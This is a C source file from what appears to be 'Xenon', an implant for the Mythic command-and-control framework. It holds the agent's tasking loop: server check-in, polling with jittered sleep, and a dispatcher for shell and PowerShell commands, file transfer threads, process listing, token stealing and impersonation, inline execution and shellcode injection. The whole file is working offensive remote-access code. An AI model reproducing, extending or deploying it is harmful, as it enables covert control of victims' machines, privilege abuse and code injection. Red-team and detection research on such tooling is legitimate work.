#include "Xenon.h"
#include "Task.h"

#include "Sleep.h"
#include "Config.h"

#include "Tasks/Agent.h"
#include "Tasks/Shell.h"
#include "Tasks/FileSystem.h"
#include "Tasks/Process.h"
#include "Tasks/Download.h"
#include "Tasks/Upload.h"
#include "Tasks/InlineExecute.h"
#include "Tasks/InjectShellcode.h"
#include "Tasks/Token.h"
#include "Tasks/Exit.h"

/**
 * @brief @brief Dispatches and executes queued tasks from Mythic server.

 * @param [in] cmd Task command ID.
 * @param [in] taskUuid Mythic's UUID for tracking tasks.
 * @param [in] taskParser PPARSER struct containing data related to the task.
 * @return VOID
 */
VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
    switch (cmd) {
#ifdef INCLUDE_CMD_STATUS     // Built-in
        case STATUS_CMD:
        {
            _dbg("STATUS_CMD was called");
            AgentStatus(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_SLEEP    // Built-in
        case SLEEP_CMD:
        {
            _dbg("CMD_SLEEP was called");
            AgentSleep(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_EXAMPLE
        case EXAMPLE_CMD:
        {
            _dbg("EXAMPLE_CMD was called");
            // CommandExample(taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_CD
        case CD_CMD:
        {
            _dbg("CD_CMD was called");
            FileSystemCd(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_PWD
        case PWD_CMD:
        {
            _dbg("PWD_CMD was called");
            FileSystemPwd(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_MKDIR
        case MKDIR_CMD:
        {
            _dbg("MKDIR_CMD was called");
            FileSystemMkdir(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_CP
        case CP_CMD:
        {
            _dbg("CP_CMD was called");
            FileSystemCopy(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_LS
        case LS_CMD:
        {
            _dbg("LS_CMD was called");
            FileSystemList(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_RM
        case RM_CMD:
        {
            _dbg("RM_CMD was called");
            FileSystemRemove(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_DOWNLOAD
        case DOWNLOAD_CMD:
        {
            _dbg("DOWNLOAD_CMD was called");
            
            // Freed inside of thread function
            TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
            if (!tp)
            {
                _err("Failed to allocate memory for task parameter.");
                return;
            }

            tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
            if (!tp->TaskParser) {
                _err("Failed to allocate memory for TaskParser.");
                free(tp->TaskUuid);
                LocalFree(tp);
                return;
            }

            // Duplicate so we don't use values that are freed before the thread finishes
            tp->TaskUuid = _strdup(taskUuid);
            ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);

            // Threaded so it doesn't block main thread (usually needs alot of requests).
            HANDLE hThread = CreateThread(NULL, 0, DownloadThread, (LPVOID)tp, 0, NULL);
            if (!hThread) {
                _err("Failed to create download thread");
                free(tp->TaskUuid);
                ParserDestroy(tp->TaskParser);
                LocalFree(tp);
            } else {
                CloseHandle(hThread); // Let the thread run independently
            }
            
            return;
        }
#endif
#ifdef INCLUDE_CMD_UPLOAD
        case UPLOAD_CMD:
        {
            _dbg("UPLOAD_CMD was called");

            // Freed inside of thread function
            TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
            if (!tp)
            {
                _err("Failed to allocate memory for task parameter.");
                return;
            }

            tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
            if (!tp->TaskParser) {
                _err("Failed to allocate memory for TaskParser.");
                free(tp->TaskUuid);
                LocalFree(tp);
                return;
            }

            // Duplicate so we don't use values that are freed before the thread finishes
            tp->TaskUuid = _strdup(taskUuid);
            ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);

            // Threaded so it doesn't block main thread (usually needs alot of requests).
            HANDLE hThread = CreateThread(NULL, 0, UploadThread, (LPVOID)tp, 0, NULL);
            if (!hThread) {
                _err("Failed to create upload thread");
                free(tp->TaskUuid);
                ParserDestroy(tp->TaskParser);
                LocalFree(tp);
            } else {
                CloseHandle(hThread); // Let the thread run independently
            }
            
            return;
        }
#endif
#ifdef INCLUDE_CMD_SHELL
        case SHELL_CMD:
        {
            _dbg("SHELL_CMD was called");
            ShellCmd(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_EXIT
        case EXIT_CMD:
        {
            _dbg("EXIT_CMD was called");
            Exit(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_PS
        case PS_CMD:
        {
            _dbg("PROCLIST_CMD was called");
            ProcessList(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_GETUID
        case GETUID_CMD:
        {
            _dbg("GETUID was called");
            TokenGetUid(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_STEAL_TOKEN
        case STEAL_TOKEN_CMD:
        {
            _dbg("STEAL_TOKEN_CMD was called");
            TokenSteal(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_MAKE_TOKEN
        case MAKE_TOKEN_CMD:
        {
            _dbg("MAKE_TOKEN_CMD was called");
            TokenMake(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_REV2SELF
    case REV2SELF_CMD:
        {
            _dbg("REV2SELF_CMD was called");
            TokenRevert(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_PWSH
        case PWSH_CMD:
        {
            _dbg("PWSH_CMD was called");
            PwshCmd(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_INLINE_EXECUTE
        case INLINE_EXECUTE_CMD:
        {
            _dbg("INLINE_EXECUTE_CMD was called");
            
            InlineExecute(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_SPAWNTO
        case SPAWNTO_CMD:
        {
            _dbg("SPAWNTO_CMD was called");
            AgentSpawnto(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_INJECT_SHELLCODE
        case INJECT_SHELLCODE_CMD:
        {
            _dbg("INJECT_SHELLCODE_CMD was called");
            InjectShellcode(taskUuid, taskParser);
            return;
        }
#endif

    }//END
}

BOOL TaskCheckin(PPARSER checkinResponseData)
{   
    if (checkinResponseData == NULL)
    {
        _err("Checkin data cannot be null.");
        return FALSE;
    }

    BOOL bStatus = FALSE;
    
    BYTE checkinByte = ParserGetByte(checkinResponseData);
    if (checkinByte != CHECKIN)
    {
        _err("CHECKIN byte 0x%x != 0xF1", checkinByte);
        goto end;
    }

    // Mythic sends a new UUID after the checkin, we need to update it
    SIZE_T sizeUuid = TASK_UUID_SIZE;
    PCHAR tempUUID = ParserGetString(checkinResponseData, &sizeUuid);

    // Allocate memory for newUUID and copy the UUID string
    PCHAR newUUID = (PCHAR)malloc(sizeUuid + 1);  // +1 for the null terminator
    if (newUUID == NULL) {
        goto end;
    }
    
    memcpy(newUUID, tempUUID, sizeUuid);  // Copy UUID bytes
    newUUID[sizeUuid] = '\0';             // Null-terminate the string

    _dbg("[CHECKIN] Setting new Agent UUID -> %s", newUUID);

    XenonUpdateUuid(newUUID);

    bStatus = TRUE;

end:
    return bStatus;
}

VOID TaskProcess(PPARSER tasks)
{
    // Determine the type of response from server (get_tasking, post_response, etc)
    BYTE typeResponse = ParserGetByte(tasks);
    
    if (typeResponse != GET_TASKING)
    {
        _err("[NONE] Task not recognized!! Byte key -> %x\n\n", typeResponse);
        return;
    }

    UINT32 numTasks = ParserGetInt32(tasks);
    if (numTasks) {
        _dbg("[TASKING] Got %d tasks!", numTasks);
    }
    
    for (UINT32 i = 0; i < numTasks; i++) 
    {       
        PARSER taskParser = { 0 };

        SIZE_T  sizeTask        = ParserGetInt32(tasks) - TASK_UUID_SIZE - 1;   // Subtract 36 (uuid) + 1 (task id)
        BYTE    taskId          = ParserGetByte(tasks);                         // Command ID
        SIZE_T  uuidLength      = TASK_UUID_SIZE;
        PCHAR   taskUuid        = ParserGetString(tasks, &uuidLength);          // Mythic task uuid
        PBYTE   taskBuffer      = ParserGetBytes(tasks, &sizeTask);             // Rest of data related to task
        
        ParserNew(&taskParser, taskBuffer, sizeTask);
        
        // Do the task one-by-one, each cmd function handles responses
        TaskDispatch(taskId, taskUuid, &taskParser);

        ParserDestroy(&taskParser);
    }
}

VOID TaskRoutine()
{
    // Create package to ask for new tasks
    PPackage req = PackageInit(GET_TASKING, TRUE);
    PackageAddInt32(req, NUMBER_OF_TASKS);

    PARSER tasks = { 0 };

    // Fills parser with todo tasks data
    BOOL bStatus = PackageSend(req, &tasks);


    if (bStatus == FALSE || &tasks == NULL)
        goto CLEANUP; 

    // Does all tasks and sends responses to server
    TaskProcess(&tasks);
    
CLEANUP:
    // Cleanup
    PackageDestroy(req);
    ParserDestroy(&tasks);

    // zzzz
    SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);

    return;
}